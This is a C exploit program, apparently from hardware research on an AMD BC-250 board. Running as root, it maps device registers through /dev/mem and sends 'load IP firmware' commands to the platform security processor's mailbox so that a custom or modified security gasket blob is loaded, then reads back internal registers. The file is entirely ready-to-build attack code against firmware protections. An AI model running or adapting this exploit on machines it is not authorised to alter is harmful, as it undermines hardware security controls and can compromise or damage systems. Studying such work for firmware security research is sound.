/*
 * A2 EXPLOIT: PSP C2P 'load IP firmware' with a custom SEC_GASKET.
 * Protocol (verified on BC-250 by Keshas 2026-08-20, amdbc250_psp.c):
 *   C2PMSG_35 @ BAR5+0x5818C = command: 0x06 | (FwType << 16)
 *   C2PMSG_36 @ BAR5+0x58190 = firmware PA low
 *   C2PMSG_37 @ BAR5+0x58194 = firmware PA high
 *   completion: C2PMSG_35 bit31 set (poll); status C2PMSG_81 @ 0x58244
 * FwType candidates (psp_gfx_fw_type): 61 = DFC_FW, 67 = REG_ACCESS_WHITELIST, 13 = VCN.
 * Gasket blob = 11792B modified (VCN bank added) or 11344B stock.
 * Run as root. Reversible: power-cycle.
 * Build: gcc -O2 -o a2_psp_c2p a2_psp_c2p.c
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <stdint.h>
#include <unistd.h>

#define C2P35 0x5818C
#define C2P36 0x58190
#define C2P37 0x58194
#define C2P64 0x58200
#define C2P81 0x58244

static volatile uint32_t *bar5;

/* physical address of a page: /proc/self/pagemap */
static uint64_t page_to_phys(void *page) {
    int fd = open("/proc/self/pagemap", O_RDONLY);
    uint64_t entry;
    lseek(fd, ((uint64_t)(uintptr_t)page >> 12) * 8, SEEK_SET);
    if (read(fd, &entry, 8) != 8) return 0;
    close(fd);
    if (!(entry >> 61 & 1)) return 0; /* not present */
    return (entry & 0x7FFFFFFFFFFFFFULL) << 12;
}

int main(int argc, char **argv) {
    if (argc < 3) { printf("usage: %s <gasket.bin> <fwtype>\n", argv[0]); return 1; }
    const char *path = argv[1];
    int fwtype = atoi(argv[2]);

    /* map BAR5 */
    char sp[256]; snprintf(sp, sizeof sp, "/sys/bus/pci/devices/0000:01:00.0/resource5");
    FILE *f = fopen(sp, "r");
    uint64_t start, end; int fl;
    if (!f || fscanf(f, "%llx-%llx %x", &start, &end, &fl) != 3) { printf("BAR5 fail\n"); return 1; }
    fclose(f);
    int mm = open("/dev/mem", O_RDWR);
    bar5 = mmap(NULL, 0x100000, PROT_READ|PROT_WRITE, MAP_SHARED, mm, start & ~(uint64_t)0xfff);
    if (bar5 == MAP_FAILED) { perror("mmap"); return 1; }

    /* load gasket into 4KB-aligned buffer */
    FILE *g = fopen(path, "rb");
    if (!g) { printf("open %s fail\n", path); return 1; }
    fseek(g, 0, SEEK_END); long sz = ftell(g); fseek(g, 0, SEEK_SET);
    void *buf = NULL;
    posix_memalign(&buf, 4096, ((sz + 4095)/4096)*4096);
    memset(buf, 0, ((sz + 4095)/4096)*4096);
    fread(buf, 1, sz, g); fclose(g);
    uint64_t pa = page_to_phys(buf);
    printf("gasket %ld bytes at VA %p PA %llx\n", sz, buf, (unsigned long long)pa);

    /* baseline C2P state */
    printf("before: C2P35=%08x C2P64=%08x C2P81=%08x\n",
           bar5[C2P35/4], bar5[C2P64/4], bar5[C2P81/4]);

    /* issue LOAD_IP_FW */
    bar5[C2P36/4] = (uint32_t)(pa & 0xFFFFFFFF);
    bar5[C2P37/4] = (uint32_t)(pa >> 32);
    uint32_t cmd = 0x06 | ((uint32_t)fwtype << 16);
    printf("sending cmd=%08x (type %d)...\n", cmd, fwtype);
    bar5[C2P35/4] = cmd;

    /* poll completion bit31, max ~2s */
    int done = 0;
    for (int i = 0; i < 2000; i++) {
        if (bar5[C2P35/4] & 0x80000000) { done = 1; break; }
        usleep(1000);
    }
    printf("after:  C2P35=%08x C2P64=%08x C2P81=%08x completion=%s\n",
           bar5[C2P35/4], bar5[C2P64/4], bar5[C2P81/4], done ? "YES" : "timeout");

    /* MMIO probe after */
    uint32_t k[4] = {0x0900C234, 0x0900CB80, 0x0900C910, 0x0900C914};
    /* NBIO SMN port for readback */
    for (int i = 0; i < 4; i++) {
        bar5[0x38/4] = k[i];
        printf("  SMN %08x = %08x\n", k[i], bar5[0x3C/4]);
    }
    return done ? 0 : 2;
}
